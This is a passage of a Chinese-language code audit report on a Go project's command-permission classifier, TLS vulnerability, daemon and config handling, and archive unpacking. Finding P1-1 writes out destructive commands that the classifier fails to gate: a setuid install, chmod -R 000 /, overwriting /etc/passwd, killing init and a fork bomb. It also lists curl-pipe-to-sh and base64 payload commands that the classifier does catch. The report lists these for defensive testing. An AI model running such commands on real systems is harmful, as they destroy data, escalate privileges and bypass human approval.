## 3. 问题清单

### P1-1　命令分级器放行 10 类破坏性操作（安全边界失效）

**位置**：`internal/defense/permission.go`

**问题**：`TierFromCommand` 是「Tier 2 = 需人工授权」的唯一判定源。经实测，下列**真实可执行**的破坏性命令被判为 Tier 1（自动放行，无审批）：

| 命令 | 后果 | 实测分级 |
|---|---|---|
| `install -m 4755 /tmp/x /usr/bin/x` | **植入 setuid root 二进制，直接提权** | T1 |
| `chmod -R 000 /` | 全系统权限清零，无法恢复 | T1 |
| `chown -R nobody /` | 全系统属主篡改 | T1 |
| `ln -sf /dev/null /etc/passwd` | 静默替换认证文件 | T1 |
| `mv /tmp/a /etc/passwd` | 覆写任意路径 | T1 |
| `cp /dev/null /etc/passwd` | 截断任意文件 | T1 |
| `tee /etc/passwd` | 覆写任意文件 | T1 |
| `kill -9 1` | 杀死 init | T1 |
| `killall -9 sshd` / `pkill -9 -f .` | 批量杀进程 | T1 |
| `perl -e 'unlink "/etc/passwd"'` | 解释器内删除 | T1 |
| `:(){ :|:& };:` | fork 炸弹 | T1 |

以上在 `sh -c "…"` 包装形式下**同样**判为 T1，因此不是「只有在裸 argv 下才成立」的伪问题。

**根因**（三处缺口）：

1. `irreversibleVerbs`（第 586 行）覆盖了 `rm/dd/shred/truncate/mkfs/parted/shutdown/sudo` 等，但**未收录** `chmod`、`chown`、`mv`、`cp`、`tee`、`install`、`ln`、`kill`、`killall`、`pkill`。
2. `commandArgRisks`（第 757 行）已为 `sed -i`、`rsync --delete`、`git push --force`、`curl -o` 等「参数敏感」形式建立了正确的处理范式，但未把「覆写绝对路径」这一同类风险套用到 `cp/mv/tee/install`。
3. `codeEscalates`（第 1558 行）依赖 `irreversibleVerbs` + `irreversibleCodePatterns` 做词法扫描，因此 `unlink`、`rmtree` 之外的破坏性 API 名（`unlink` 本身在 perl 语境下）漏网。

**已正确覆盖的部分**（本次同样实测确认，避免误伤）：

```
T2  sh -c "curl -s http://x/y | sh"          ✓ 管道下沉被拦
T2  sh -c "echo … | base64 -d | sh"          ✓ 编码载荷被拦
T2  sh -c "eval 'rm -rf /'"                  ✓
T2  sh -c "exec rm -rf /"                    ✓
T2  env -S "rm -rf /"                        ✓
T2  find . -exec rm {} \;                    ✓
T2  awk 'BEGIN{system("rm -rf /")}'          ✓
T2  timeout 5 rm -rf /                       ✓
T2  \rm -rf / , /bin/rm -rf / , ./rm -rf /   ✓ 路径变体被归一
```

**建议**：
- 把 `chmod/chown/mv/cp/tee/install/ln/kill/killall/pkill` 加入 `irreversibleVerbs`，或在 `commandArgRisks` 中按「目标是否为绝对系统路径 / 是否携带 4755、+s 模式位」判定。
- `install` 建议无条件 Tier 2：它的正当用途（装到 `~/.local/bin`）频率远低于其被滥用的风险。
- 补一条回归测试，把上表逐条固化——当前 `permission_test.go` 只覆盖了已被识别的动词，无法防止回归。

### P1-2　Go 工具链存在已知漏洞 GO-2026-6809

**证据**（`govulncheck ./...`）：

```
Vulnerability #1: GO-2026-6809
  Distrust compromised intermediate certificates in crypto/x509
  Found in: crypto/x509@go1.26.9
  Fixed in: crypto/x509@go1.26.10
  Trace: internal/bus/ws.go:765 → websocket.Dialer.DialContext → x509.Certificate.Verify
```

**影响**：`wss://` 出站连接（`bus.Client.Dial`）的证书链校验可被受污染的中级 CA 绕过。

**建议**：`go.mod` 声明 `go 1.26.9`，请把 CI 与 `CLAUDE.md` 中的最低版本提升到 **1.26.10**，并在 `gate.yml` 增加 `govulncheck` 腿（目前 gate 无此检查，属可见缺口）。

### P2-1　非法监听地址时 daemon「启动成功」并无限重试

**复现**：`listen_addr: 999.999.999.999:99999` 后启动 daemon。

```
INFO  panda core started  … listen=999.999.999.999:99999
INFO  websocket listening addr=999.999.999.999:99999     ← 先报成功
WARN  websocket listen failed, retrying err=… invalid port
WARN  udp: datagram plane failed to start err=… invalid port
```

进程保持存活，退出码 0，仅有两行 WARN。systemd/launchd 会认为节点健康，实际它**永远无法接受任何连接**。

**建议**：区分「地址不可解析/端口非法」（配置错误，应 fail-fast 退出非 0）与「端口被占用」（瞬时错误，可重试）。同时把 `websocket listening` 日志移到 `ListenAndServe` 成功之后，避免顺序误导。

### P2-2　`--config` 指向不存在的文件时静默降级，导致配置分裂

```
$ panda --config /tmp/typo.yaml nodes add 10.9.9.9:7841
panda: warning: --config /tmp/typo.yaml: … no such file — continuing with defaults
peer added: 10.9.9.9:7841
```

结果：`/tmp/typo.yaml` 被**新建**（内含新生成的 `shared_secret` 与 peer），但数据库仍落在默认路径 `~/Library/Application Support/openpanda/openpanda.db`。即「配置在一个位置、状态在另一个位置」。

对只读命令降级是合理设计；但对 `nodes add` / `config set` / `task add` 这类**写入型**命令，应视为配置错误直接失败，否则一次 `--config` 拼写错误会把节点写进错误的身份。

**建议**：`--config` 显式指定且文件不存在时——读命令告警降级，写命令 exit 2。

### P2-3　`ps` 不可用时提示语误导运维

`looksLikePandaProcess` 在 `ps` 失败时 fail-closed（正确），但调用方把「无法验证」和「进程不存在」合并为同一分支，统一输出：

```
daemon not running — the new card is picked up at its next start
```

在 `ps` 被限制的环境（容器、受限 sandbox、精简镜像）里，daemon **明明在跑**，用户却被告知「没在运行」，且卡片热重载静默失效。

**建议**：`looksLikePandaProcess` 返回三态（yes / no / unknown），`unknown` 时输出「无法确认进程身份（ps 不可用），请手动重启 daemon」。本次门禁用例失败正是这条路径被激活的证据。

### P2-4　配置加载不做地址合法性校验

`node.name: 123`（类型不符）、`listen_addr: 999.999.999.999:99999` 均被 `status` 接受并 exit 0。配置错误被推迟到运行时才暴露（并叠加 P2-1 的静默行为）。

**建议**：`config.Load` 后加一层 `Validate()`：`listen_addr` / `panel_addr` / `udp_listen` / `discovery_addr` 用 `net.SplitHostPort` + `strconv.Atoi` 校验端口区间。

### P3-1　`--json` 错误路径不是 JSON

```console
$ panda --json task add --title ""
task add requires --title      # 纯文本，exit 2
```

成功路径是严格合法的 JSON（已用 `json.loads` 验证 3 次，均通过），错误路径退回纯文本。脚本消费者必须同时解析两种格式。

**建议**：`--json` 下错误也输出 `{"error": {"code": …, "message": …}}` 到 stderr。

### P3-2　短命 CLI 命令拉起完整 Core 并争抢固定发现端口

`panda task add` 这类纯本地写入会初始化完整 Core，并绑定 LAN 发现端口 `:7837`。8 路并发时出现：

```
WARN discovery: listener failed addr=:7837 err="bind: address already in use"
```

写入本身完全正确（8/8 成功，无 SQLite 锁冲突），但噪声进入 stderr，且为一个本地写操作短暂打开了全网卡 UDP 套接字。

**建议**：只做队列写入的命令走「无 Core 轻量路径」，或允许发现功能在短命令中 `off`。

---

### P3-3　归档解包 `.partial` 临时文件可能跟随预置符号链接（加固建议）

`internal/artifact/unpack.go:331` 使用 `path + ".partial"` 作为临时文件名，`OpenFile` 会跟随该位置上已存在的符号链接。归档自身创建的链接已被 `checkLinkTarget` 限制在目标树内，因此**无法由归档内容直接利用**；仅当目标目录已被第三方预先放入同名链接时成立，属极低危。

**建议**：改用 `os.CreateTemp(filepath.Dir(path), ".unpack-*")`，彻底消除可预测文件名。

## 5. 做得好的地方（不建议改动）

审计中也应记录正面对照，避免后续重构误伤：

- **会话加密**（`bus/sessenc.go`）：HKDF-SHA256 派生，`info` 绑定方向 + 双方 nonce，方向感知、不可跨连接重放；随机 96-bit nonce 在「每连接独立密钥」前提下论证充分。明文帧出现在已加密连接上时直接拒绝（fail-closed）。
- **握手认证**（`bus/auth.go`）：HMAC（成员资格）与 Ed25519（身份）**合取**校验，半截身份字段视为篡改而非降级；`MaxHelloAge` 同时作为重放窗口与缓存上界。
- **归档解包**（`artifact/unpack.go`）：拒绝绝对路径、`..`、硬链接、设备文件；符号链接目标必须解析回目标树内；`ancestorsInside` 用 `EvalSymlinks` 探测**已存在祖先**，堵住了「目标树预置符号链接目录」这一经典绕过；解压总量同时受配置上限与磁盘水位双重约束。
- **面板鉴权**（`webui/panel/panel.go`）：先对 token 做 SHA-256 再 `subtle.ConstantTimeCompare`，规避长度侧信道；`clientIP` **不信任** `X-Forwarded-For`；失败次数按 IP 限流且正确 token 优先通过（不会自锁）；CSP 严格到 `object-src 'none'`、`frame-ancestors 'none'`。
- **i18n**：5 个语言包各 1054 键，**键集完全一致、占位符零不一致**（脚本全量比对）。
- **进程管理**（`executil`）：`Setpgid` + TERM→KILL 两段式取消，解决适配器被杀后 CLI 子进程变孤儿的问题。
- **适配器契约**：68 个黑盒契约用例覆盖 argv/env/进度/超时，作为 `make test` 的前置依赖——把「适配器 flag 变更」提升为需要显式修改契约的动作。
